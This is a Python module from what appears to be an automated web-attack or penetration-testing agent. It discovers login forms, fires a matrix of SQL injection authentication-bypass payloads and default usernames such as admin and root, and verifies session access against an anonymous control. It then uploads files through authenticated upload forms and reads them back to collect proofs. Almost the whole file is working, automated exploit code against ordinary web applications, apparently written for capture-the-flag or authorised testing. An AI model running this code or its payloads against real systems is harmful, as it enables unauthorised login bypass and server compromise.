from __future__ import annotations

import hashlib
import json
import re
import secrets
from dataclasses import dataclass, field
from typing import TYPE_CHECKING
from urllib.parse import urlsplit

from ravage.deterministic_agents.auth_forms import (
    _form_script_headers,
    _forms_from_html,
    _fresh_form_from_response,
    _submit_form,
)
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.probes.file_read.upload import (
    _file_input_name,
    _probe_uploaded_file_readback,
    _submit_multipart_upload,
    _upload_attempts,
    _upload_form_brief,
)
from ravage.probes.sqli_auth_upload_closure import (
    evidence_directed_upload_readback_urls,
    prioritize_observed_upload_attempts,
)
from ravage.probes.sqli_extractor.auth import _login_targets
from ravage.runtime.common import clip
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, form_defaults
from ravage.web_core.proof_recognizer import recognize_proofs

if TYPE_CHECKING:
    from collections.abc import Iterable

    from ravage.agent_core.agent_state import AgentState

PROBE_NAME = "sqli_auth_transition"
PROBE_PURPOSE = (
    "use a finite SQL authentication-transition matrix, require protected same-session "
    "verification, then close an authenticated upload/readback path without replaying a "
    "stored hash as plaintext"
)

_REQUEST_LIMIT = 64
_LOGIN_CASE_LIMIT = 18
_FOLLOWUP_PATH_LIMIT = 7
_UPLOAD_ATTEMPT_LIMIT = 4
_UPLOAD_READBACK_LIMIT = 18
_MAX_USERNAME_LENGTH = 96
_GENERIC_USERNAME_TOKENS = frozenset(
    {
        "button",
        "command",
        "cookie",
        "data",
        "endpoint",
        "field",
        "file",
        "form",
        "input",
        "mapping",
        "parameter",
        "phpsessid",
        "query",
        "replay",
        "session",
        "submit",
        "text",
        "type",
        "value",
        "workflow",
    }
)
_HTTP_SUCCESS_MIN = 200
_HTTP_SUCCESS_MAX = 300
_LOGIN_DISCOVERY_PATHS = (
    "",
    "/index.php",
    "/login",
    "/login.php",
    "/signin",
    "/signin.php",
)
_PROTECTED_PATHS = (
    "/dashboard.php",
    "/dashboard",
    "/admin",
    "/admin.php",
    "/account",
    "/profile",
    "/upload.php",
    "/upload",
    "/",
)
_IDENTITY_MARKERS = ("username", "user", "login", "email")
_PASSWORD_MARKERS = ("password", "passwd", "pass")
_SUCCESS_VALUES = {
    "authenticated",
    "authentication successful",
    "logged in",
    "login successful",
    "ok",
    "success",
    "successful",
    "true",
}
_DENIED_VALUES = {
    "denied",
    "error",
    "failed",
    "false",
    "invalid",
    "password",
    "unauthorized",
    "username",
}
_PROTECTED_MARKERS = (
    "admin panel",
    "dashboard",
    "logout",
    "sign out",
    "upload",
    "account",
    "profile",
    'type="file"',
    "type='file'",
)


@dataclass(frozen=True)
class _AuthCase:
    input_name: str
    username: str
    password: str
    payload: str
    technique: str


@dataclass
class _Budget:
    limit: int = _REQUEST_LIMIT
    used: int = 0
    requests: list[dict[str, object]] = field(default_factory=list)

    @property
    def remaining(self) -> int:
        return max(0, self.limit - self.used)

    def available(self, count: int = 1) -> bool:
        return self.remaining >= count

    def record(
        self,
        response: ProbeResponse,
        *,
        phase: str,
        body_chars: int = 260,
        **metadata: object,
    ) -> None:
        self.used += 1
        self.requests.append(
            response.summary(body_chars=body_chars)
            | {
                "phase": phase,
                **metadata,
            }
        )

    def absorb(self, requests: list[dict[str, object]], *, allocated: int, remaining: int) -> None:
        consumed = max(0, allocated - remaining)
        self.used += consumed
        self.requests.extend(requests)


@dataclass(frozen=True)
class _VerifiedTransition:
    case: _AuthCase
    session: ProbeSession
    login_target: dict[str, object]
    login_response: ProbeResponse
    login_signal: str
    protected_response: ProbeResponse
    anonymous_response: ProbeResponse
    protected_url: str
    forms: tuple[dict[str, object], ...]


def probe_sqli_auth_transition(
    session: ProbeSession,
    state: AgentState,
) -> ProbeRunResult:
    budget = _Budget()
    targets = _discover_login_targets(session, state, budget)
    if not targets:
        return _result(
            budget=budget,
            findings=[],
            errors=["no live username/password login contract was discovered"],
            terminal_reason="no_login_contract",
        )

    usernames = _candidate_usernames(state)
    cases = _auth_cases(usernames)[:_LOGIN_CASE_LIMIT]
    attempts: list[dict[str, object]] = []
    for target in targets[:4]:
        if not budget.available(2):
            break
        baseline = _login_baseline(session, target, budget)
        if baseline is None:
            continue
        for case in cases:
            if not budget.available(4):
                break
            transition = _attempt_case(
                session,
                target,
                case=case,
                baseline=baseline,
                budget=budget,
            )
            attempts.append(
                {
                    "input": case.input_name,
                    "technique": case.technique,
                    "username": case.username,
                    "payload": clip(case.payload, 180),
                    "verified": transition is not None,
                }
            )
            if transition is None:
                continue
            finding = _transition_finding(transition, attempts=attempts)
            upload_findings, proofs = _close_authenticated_upload(
                transition,
                state=state,
                budget=budget,
            )
            finding["upload_findings"] = upload_findings
            finding["proofs"] = proofs
            findings = [finding, *upload_findings]
            return _result(
                budget=budget,
                findings=findings,
                errors=[],
                terminal_reason=("proof_closed" if proofs else "authenticated_transition_verified"),
            )

    findings: list[dict[str, object]] = []
    if attempts:
        findings.append(
            {
                "type": "sqli_auth_transition_exhausted",
                "attempts": attempts,
                "request_limit": budget.limit,
                "request_count": budget.used,
                "next": (
                    "The finite username/password transition matrix was target-observed "
                    "exhausted. Do not replay the same stored value or matrix unchanged."
                ),
            }
        )
    return _result(
        budget=budget,
        findings=findings,
        errors=[],
        terminal_reason=(
            "request_budget_exhausted" if not budget.remaining else "matrix_exhausted"
        ),
    )


def _discover_login_targets(
    session: ProbeSession,
    state: AgentState,
    budget: _Budget,
) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    targets.extend(_login_targets(state, session, include_fallback=False))
    for path in _LOGIN_DISCOVERY_PATHS:
        if not budget.available():
            break
        response = session.get(session.target_url if not path else session.absolute(path))
        budget.record(response, phase="login_contract_discovery", body_chars=220)
        if response.status is None:
            continue
        targets.extend(
            {
                "kind": "live_form",
                "url": str(form.get("action") or response.final_url),
                "source_url": response.final_url,
                "form": form,
            }
            for form in _live_forms(response)
            if _looks_like_login_form(form)
        )
        if targets:
            break
    if not targets:
        targets.extend(_login_targets(state, session, include_fallback=True))
    return _dedupe_targets(targets)


def _live_forms(response: ProbeResponse) -> list[dict[str, object]]:
    forms = _forms_from_html(
        response.final_url,
        response.body,
        auth_headers={},
        base_categories=(),
    )
    live: list[dict[str, object]] = []
    for form in forms:
        refreshed = _fresh_form_from_response(form, response) or form
        refreshed["source_url"] = response.final_url
        refreshed["page_context"] = _page_context(response.body)
        live.append(refreshed)
    return live


def _page_context(body: str) -> str:
    lowered = body.lower()
    markers = [
        marker
        for marker in (
            "pdf",
            "invoice",
            "image",
            "avatar",
            "upload",
            "resume",
            "pickle",
            "yaml",
        )
        if marker in lowered
    ]
    return " ".join(markers)


def _looks_like_login_form(form: dict[str, object]) -> bool:
    names = _form_names(form)
    return bool(
        any(any(marker in name for marker in _IDENTITY_MARKERS) for name in names)
        and any(any(marker in name for marker in _PASSWORD_MARKERS) for name in names)
    )


def _form_names(form: dict[str, object]) -> tuple[str, ...]:
    inputs = form.get("inputs")
    if not isinstance(inputs, list):
        return ()
    return tuple(
        str(item.get("name") or "").strip().lower()
        for item in inputs
        if isinstance(item, dict) and str(item.get("name") or "").strip()
    )


def _dedupe_targets(targets: list[dict[str, object]]) -> list[dict[str, object]]:
    deduped: dict[tuple[str, tuple[str, ...]], dict[str, object]] = {}
    for target in targets:
        form = target.get("form")
        form_dict = dict(form) if isinstance(form, dict) else {}
        url = str(target.get("url") or form_dict.get("action") or "")
        if not url:
            continue
        key = (url.rstrip("/"), _form_names(form_dict))
        deduped.setdefault(key, target)
    return list(deduped.values())[:6]


def _candidate_usernames(state: AgentState) -> list[str]:
    observed: list[str] = []
    material = json.dumps(
        {
            "surface": state.surface,
            "signals": state.signals,
            "facts": state.facts[-30:],
            "last_observation": state.last_observation,
        },
        sort_keys=True,
        default=str,
    )
    pattern = re.compile(
        r"""(?i)["']?(?:username|user|login|email|name)["']?\s*[:=]\s*["']([^"'\\\s]{1,96})"""
    )
    for match in pattern.finditer(material):
        candidate = match.group(1).strip()
        if _safe_username(candidate):
            observed.append(candidate.split("@", 1)[0])
    observed = _dedupe_strings(observed)
    ranked = [*observed[:1], "admin", *observed[1:2], "administrator", "root", "user"]
    return _dedupe_strings(ranked)[:4]


def _safe_username(value: str) -> bool:
    if not value or len(value) > _MAX_USERNAME_LENGTH:
        return False
    if value.lower() in {
        *_GENERIC_USERNAME_TOKENS,
        "email",
        "login",
        "name",
        "pass",
        "password",
        "user",
        "username",
    }:
        return False
    return not any(marker in value.lower() for marker in ("'", '"', "--", " or ", "select"))


def _auth_cases(usernames: list[str]) -> list[_AuthCase]:
    cases: list[_AuthCase] = []
    primary = usernames[0] if usernames else "admin"
    cases.extend(_password_cases(primary, complete=True))
    for username in usernames[1:]:
        cases.extend(_password_cases(username, complete=False))
    cases.extend(_username_cases(usernames))
    return _dedupe_cases(cases)


def _password_cases(username: str, *, complete: bool) -> list[_AuthCase]:
    escaped = username.replace("'", "''")
    payloads = [
        ("x')) OR 1=1-- -", "password_double_parenthesis"),
        (
            f"x'),MD5('{escaped}'))) OR 1=1-- -",
            "password_nested_function_parenthesis",
        ),
        ("x') OR 1=1-- -", "password_single_parenthesis"),
    ]
    if complete:
        payloads.extend(
            [
                ("x' OR 1=1-- -", "password_single_quote"),
                ("' OR '1'='1'-- -", "password_boolean_quote"),
                ('" OR "1"="1"-- -', "password_double_quote"),
            ]
        )
    return [
        _AuthCase(
            input_name="password",
            username=username,
            password=payload,
            payload=payload,
            technique=technique,
        )
        for payload, technique in payloads
    ]


def _username_cases(usernames: list[str]) -> list[_AuthCase]:
    cases: list[_AuthCase] = []
    for username in usernames[:3]:
        for payload, technique in (
            (f"{username}'-- -", "username_comment"),
            (f"{username}' OR 1=1-- -", "username_boolean"),
        ):
            cases.append(
                _AuthCase(
                    input_name="username",
                    username=payload,
                    password=f"ravage-invalid-{secrets.token_hex(6)}",
                    payload=payload,
                    technique=technique,
                )
            )
    return cases


def _dedupe_cases(cases: Iterable[_AuthCase]) -> list[_AuthCase]:
    deduped: dict[tuple[str, str, str], _AuthCase] = {}
    for case in cases:
        key = (case.input_name, case.username, case.password)
        deduped.setdefault(key, case)
    return list(deduped.values())


def _login_baseline(
    root_session: ProbeSession,
    target: dict[str, object],
    budget: _Budget,
) -> ProbeResponse | None:
    attempt_session = root_session.fork()
    live_target = _refresh_target(attempt_session, target, budget, phase="login_baseline_refresh")
    if live_target is None or not budget.available():
        return None
    form = _target_form(live_target)
    fields = _credential_fields(
        form,
        username=f"ravage-invalid-{secrets.token_hex(4)}",
        password=f"ravage-invalid-{secrets.token_hex(6)}",
    )
    response = _submit_form(
        attempt_session,
        form,
        fields,
        headers=_form_script_headers(form) or None,
    )
    budget.record(
        response,
        phase="login_rejected_baseline",
        fields=sorted(fields),
    )
    return response


def _attempt_case(
    root_session: ProbeSession,
    target: dict[str, object],
    *,
    case: _AuthCase,
    baseline: ProbeResponse,
    budget: _Budget,
) -> _VerifiedTransition | None:
    attempt_session = root_session.fork()
    live_target = _refresh_target(
        attempt_session,
        target,
        budget,
        phase="login_transition_refresh",
    )
    if live_target is None or not budget.available():
        return None
    form = _target_form(live_target)
    fields = _credential_fields(form, username=case.username, password=case.password)
    response = _submit_form(
        attempt_session,
        form,
        fields,
        headers=_form_script_headers(form) or None,
    )
    budget.record(
        response,
        phase="login_transition_attempt",
        input=case.input_name,
        technique=case.technique,
        payload=clip(case.payload, 180),
        fields=sorted(fields),
    )
    signal = _login_transition_signal(response, baseline=baseline)
    if signal == "denied":
        return None
    return _verify_transition(
        root_session,
        attempt_session,
        live_target,
        case=case,
        response=response,
        login_signal=signal,
        budget=budget,
    )


def _refresh_target(
    session: ProbeSession,
    target: dict[str, object],
    budget: _Budget,
    *,
    phase: str,
) -> dict[str, object] | None:
    if not budget.available():
        return None
    form = _target_form(target)
    source_url = str(
        target.get("source_url")
        or form.get("source_url")
        or form.get("action")
        or target.get("url")
        or session.target_url
    )
    response = session.get(source_url)
    budget.record(response, phase=phase, body_chars=160)
    if response.status is None:
        return None
    candidates = [item for item in _live_forms(response) if _looks_like_login_form(item)]
    matched = _matching_form(form, candidates)
    if matched is None:
        if form:
            return target
        return None
    return {
        "kind": "live_form",
        "url": str(matched.get("action") or target.get("url") or response.final_url),
        "source_url": response.final_url,
        "form": matched,
    }


def _matching_form(
    expected: dict[str, object],
    candidates: list[dict[str, object]],
) -> dict[str, object] | None:
    if not candidates:
        return None
    expected_names = set(_form_names(expected))
    ranked = sorted(
        candidates,
        key=lambda candidate: (
            -len(expected_names & set(_form_names(candidate))),
            str(candidate.get("action") or ""),
        ),
    )
    return ranked[0]


def _target_form(target: dict[str, object]) -> dict[str, object]:
    form = target.get("form")
    if isinstance(form, dict):
        return dict(form)
    return {
        "action": str(target.get("url") or ""),
        "method": "POST",
        "inputs": [
            {"name": "username", "type": "text", "value": ""},
            {"name": "password", "type": "password", "value": ""},
        ],
    }


def _credential_fields(
    form: dict[str, object],
    *,
    username: str,
    password: str,
) -> dict[str, str]:
    fields = form_defaults(form)
    identity_fields = [
        name
        for name in fields
        if any(marker in name.lower() for marker in _IDENTITY_MARKERS)
        and not any(marker in name.lower() for marker in _PASSWORD_MARKERS)
    ]
    password_fields = [
        name for name in fields if any(marker in name.lower() for marker in _PASSWORD_MARKERS)
    ]
    if identity_fields:
        for name in identity_fields:
            fields[name] = username
    else:
        fields["username"] = username
    if password_fields:
        for name in password_fields:
            fields[name] = password
    else:
        fields["password"] = password
    return fields


def _login_transition_signal(response: ProbeResponse, *, baseline: ProbeResponse) -> str:
    structured = _structured_login_signal(response.body)
    if structured:
        return structured
    lowered = response.body.lower()
    if any(
        marker in lowered
        for marker in (
            "invalid username",
            "invalid password",
            "login failed",
            "authentication failed",
            "unauthorized",
        )
    ):
        return "denied"
    if any(marker in lowered for marker in ("logout", "dashboard", "logged in", "welcome")):
        return "explicit_body_success"
    location = _location(response).lower()
    if location and any(
        marker in location for marker in ("dashboard", "admin", "account", "profile", "upload")
    ):
        return "protected_redirect"
    if _material_response_delta(response, baseline=baseline):
        return "material_response_delta"
    return "denied"


def _structured_login_signal(body: str) -> str:  # noqa: PLR0911
    try:
        payload = json.loads(body)
    except (TypeError, ValueError):
        return ""
    if not isinstance(payload, dict):
        return ""
    for key in ("authenticated", "logged_in", "ok", "success"):
        value = payload.get(key)
        if value is True:
            return f"json_{key}"
        if value is False:
            return "denied"
    for key in ("response", "result", "status", "message"):
        value = str(payload.get(key) or "").strip().lower()
        if value in _SUCCESS_VALUES:
            return f"json_{key}_success"
        if value in _DENIED_VALUES or any(
            marker in value for marker in ("invalid", "fail", "denied")
        ):
            return "denied"
    return ""


def _material_response_delta(response: ProbeResponse, *, baseline: ProbeResponse) -> bool:
    if response.status != baseline.status:
        return True
    if _location(response) != _location(baseline):
        return True
    response_digest = hashlib.sha256(response.body.encode()).digest()
    baseline_digest = hashlib.sha256(baseline.body.encode()).digest()
    if response_digest == baseline_digest:
        return False
    response_cookies = _session_cookie_names(response)
    baseline_cookies = _session_cookie_names(baseline)
    return bool(response_cookies or response_cookies != baseline_cookies)


def _session_cookie_names(response: ProbeResponse) -> tuple[str, ...]:
    header = str(response.headers.get("set-cookie") or response.headers.get("Set-Cookie") or "")
    names = re.findall(r"(?:^|,\s*)([A-Za-z0-9_.-]+)=", header)
    return tuple(sorted(set(names)))


def _verify_transition(  # noqa: PLR0913
    root_session: ProbeSession,
    authenticated: ProbeSession,
    target: dict[str, object],
    *,
    case: _AuthCase,
    response: ProbeResponse,
    login_signal: str,
    budget: _Budget,
) -> _VerifiedTransition | None:
    for url in _protected_urls(authenticated, response)[:_FOLLOWUP_PATH_LIMIT]:
        if not budget.available(2):
            return None
        protected = authenticated.get(url)
        budget.record(
            protected,
            phase="authenticated_followup",
            body_chars=360,
            candidate_url=url,
        )
        anonymous_session = root_session.fork()
        anonymous = anonymous_session.get(url)
        budget.record(
            anonymous,
            phase="anonymous_control",
            body_chars=240,
            candidate_url=url,
        )
        forms = _live_forms(protected)
        if not _protected_same_session_delta(
            protected,
            anonymous,
            forms=forms,
            candidate_url=url,
        ):
            continue
        return _VerifiedTransition(
            case=case,
            session=authenticated,
            login_target=target,
            login_response=response,
            login_signal=login_signal,
            protected_response=protected,
            anonymous_response=anonymous,
            protected_url=url,
            forms=tuple(forms),
        )
    return None


def _protected_urls(session: ProbeSession, response: ProbeResponse) -> list[str]:
    urls: list[str] = []
    location = _location(response)
    if location:
        urls.append(session.absolute(location))
    for match in re.finditer(
        r"""(?is)(?:href|action)\s*=\s*["']([^"'#]{1,300})["']""",
        response.body,
    ):
        value = match.group(1).strip()
        lowered = value.lower()
        if any(
            marker in lowered for marker in ("dashboard", "admin", "account", "profile", "upload")
        ):
            urls.append(session.absolute(value))
    urls.extend(session.absolute(path) for path in _PROTECTED_PATHS)
    return _dedupe_strings(urls)


def _protected_same_session_delta(  # noqa: PLR0911
    protected: ProbeResponse,
    anonymous: ProbeResponse,
    *,
    forms: list[dict[str, object]],
    candidate_url: str,
) -> bool:
    if protected.status is None or not (_HTTP_SUCCESS_MIN <= protected.status < _HTTP_SUCCESS_MAX):
        return False
    if recognize_proofs(protected.body):
        return True
    protected_body = protected.body.lower()
    anonymous_body = anonymous.body.lower()
    has_upload_form = any(_file_input_name(form) for form in forms)
    strong_marker = has_upload_form or any(
        marker in protected_body for marker in _PROTECTED_MARKERS
    )
    if not strong_marker:
        return False
    if _same_body(protected.body, anonymous.body):
        return False
    if anonymous.status in {301, 302, 303, 307, 308, 401, 403}:
        return True
    anonymous_location = _location(anonymous).lower()
    if any(marker in anonymous_location for marker in ("login", "signin", "sign-in")):
        return True
    if _looks_like_login_html(anonymous_body):
        return True
    path = urlsplit(candidate_url).path.lower()
    return any(marker in path for marker in ("dashboard", "admin", "account", "profile", "upload"))


def _same_body(left: str, right: str) -> bool:
    return hashlib.sha256(left.encode()).digest() == hashlib.sha256(right.encode()).digest()


def _looks_like_login_html(body: str) -> bool:
    return "<form" in body and any(marker in body for marker in ("password", "signin", "login"))


def _transition_finding(
    transition: _VerifiedTransition,
    *,
    attempts: list[dict[str, object]],
) -> dict[str, object]:
    form = _target_form(transition.login_target)
    return {
        "type": "sqli_auth_bypass_session",
        "capability": PROBE_NAME,
        "authenticated": True,
        "same_session": True,
        "input": transition.case.input_name,
        "technique": transition.case.technique,
        "username": transition.case.username,
        "payload": clip(transition.case.payload, 180),
        "login_signal": transition.login_signal,
        "login_url": str(form.get("action") or transition.login_response.url),
        "protected_url": transition.protected_url,
        "login_response": transition.login_response.summary(body_chars=320),
        "protected_response": transition.protected_response.summary(body_chars=420),
        "anonymous_control": transition.anonymous_response.summary(body_chars=260),
        "forms": list(transition.forms[:6]),
        "attempts": attempts,
        "next": (
            "Authentication was accepted only after a protected same-session response "
            "differed from a fresh anonymous control. Continue closure in this probe's "
            "preserved session; do not treat a cookie alone as success."
        ),
    }


def _close_authenticated_upload(  # noqa: C901, PLR0911
    transition: _VerifiedTransition,
    *,
    state: AgentState,
    budget: _Budget,
) -> tuple[list[dict[str, object]], list[str]]:
    findings: list[dict[str, object]] = []
    proofs = recognize_proofs(transition.protected_response.body)
    if proofs:
        return findings, proofs
    for form in transition.forms[:6]:
        file_field = _file_input_name(form)
        if not file_field:
            continue
        uploads = prioritize_observed_upload_attempts(
            _upload_attempts(state=state, form=form),
            form=form,
        )
        for upload in uploads[:_UPLOAD_ATTEMPT_LIMIT]:
            if not budget.available():
                return findings, proofs
            response = _submit_multipart_upload(
                transition.session,
                form,
                file_field=file_field,
                upload=upload,
            )
            budget.record(
                response,
                phase="authenticated_upload",
                body_chars=520,
                filename=upload["filename"],
                file_field=file_field,
                form=_upload_form_brief(form),
            )
            direct_proofs = recognize_proofs(response.body)
            if direct_proofs:
                proofs.extend(item for item in direct_proofs if item not in proofs)
                findings.append(
                    {
                        "type": "authenticated_upload_proof",
                        "filename": upload["filename"],
                        "proofs": direct_proofs,
                        "response": response.summary(body_chars=700),
                    }
                )
                return findings, proofs
            evidence_finding, evidence_proofs = _evidence_directed_upload_readback(
                transition,
                upload=upload,
                upload_response=response,
                budget=budget,
            )
            if evidence_finding is not None:
                findings.append(evidence_finding)
            proofs.extend(item for item in evidence_proofs if item not in proofs)
            if proofs:
                return findings, proofs
            allocated = min(budget.remaining, _UPLOAD_READBACK_LIMIT)
            if allocated <= 0:
                return findings, proofs
            readback, requests, remaining = _probe_uploaded_file_readback(
                transition.session,
                form=form,
                upload=upload,
                upload_response=response,
                budget=allocated,
            )
            for request in requests:
                request["phase"] = "authenticated_upload_readback"
            budget.absorb(requests, allocated=allocated, remaining=remaining)
            if readback is None:
                continue
            findings.append(readback)
            readback_proofs = _string_list(readback.get("proofs"))
            proofs.extend(item for item in readback_proofs if item not in proofs)
            if proofs:
                return findings, proofs
    return findings, proofs


def _evidence_directed_upload_readback(
    transition: _VerifiedTransition,
    *,
    upload: dict[str, object],
    upload_response: ProbeResponse,
    budget: _Budget,
) -> tuple[dict[str, object] | None, list[str]]:
    for readback_url in evidence_directed_upload_readback_urls(
        transition.session,
        upload_response=upload_response,
        filename=str(upload["filename"]),
    ):
        if not budget.available():
            break
        readback_response = transition.session.get(readback_url)
        budget.record(
            readback_response,
            phase="authenticated_upload_evidence_readback",
            body_chars=520,
            filename=upload["filename"],
        )
        proofs = recognize_proofs(readback_response.body)
        if not proofs:
            continue
        return (
            {
                "type": "authenticated_upload_readback_proof",
                "filename": upload["filename"],
                "url": readback_response.url,
                "proofs": proofs,
                "response": readback_response.summary(body_chars=700),
            },
            proofs,
        )
    return None, []


def _location(response: ProbeResponse) -> str:
    return str(response.headers.get("location") or response.headers.get("Location") or "")


def _string_list(value: object) -> list[str]:
    if not isinstance(value, list):
        return []
    return [str(item) for item in value if str(item)]


def _dedupe_strings(values: Iterable[str]) -> list[str]:
    return list(dict.fromkeys(value for value in values if value))


def _result(
    *,
    budget: _Budget,
    findings: list[dict[str, object]],
    errors: list[str],
    terminal_reason: str,
) -> ProbeRunResult:
    proofs = {proof for finding in findings for proof in _string_list(finding.get("proofs"))}
    authenticated = any(finding.get("authenticated") is True for finding in findings)
    return ProbeRunResult(
        ok=bool(authenticated or proofs),
        probe=PROBE_NAME,
        summary=(
            f"terminal_reason={terminal_reason}, authenticated={str(authenticated).lower()}, "
            f"proofs={len(proofs)}, requests={budget.used}/{budget.limit}"
        ),
        findings=findings[:20],
        requests=budget.requests[:_REQUEST_LIMIT],
        errors=errors[:10],
    )


__all__ = [
    "PROBE_NAME",
    "PROBE_PURPOSE",
    "probe_sqli_auth_transition",
]
